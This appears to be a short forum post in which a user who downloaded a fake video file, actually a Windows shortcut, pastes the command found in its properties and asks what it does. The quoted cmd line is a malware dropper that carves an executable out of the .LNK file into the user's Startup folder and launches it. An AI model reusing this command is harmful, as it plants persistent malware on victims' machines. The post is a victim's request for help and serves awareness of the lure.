I downloaded a video, didn't check. Turned out to be a shortcut with this in the description. It quickly started a cmd file that was using 100% of CPU. Anyone know what this does? It doesn't seem like it would be super malicious but have no idea

%COMSPEC% /V:on/CSet C=Last.Week.Tonight.with.John.Oliver.S11E29.1080p.mkv&Set G="%appdata%\\MICROSOFT\\WINDOWS\\Start menu\\Programs\\Startup\\%username%.exe"&(if not exist !G! Findstr/V "System32 cfi%TIME:~7,1%%TIME:~-2%" !C!.LNK>!G!&START "" !G!)&CD %TEMP%&Echo.

Edit: still not sure what it does. But using chatgpt found where it saved an exe file and deleted that too
